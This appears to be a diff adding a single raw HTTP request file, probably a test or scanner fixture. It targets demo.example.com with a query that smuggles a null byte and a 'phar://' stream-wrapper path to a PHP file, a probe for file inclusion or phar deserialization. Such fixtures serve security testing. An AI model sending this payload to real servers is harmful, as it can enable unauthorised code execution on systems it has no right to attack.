@@ -1,0 +1,4 @@
+GET /a?q=/*%00*/phar://phar.phar/x.php HTTP/1.1
+Host: demo.example.com
+Connection: close
+
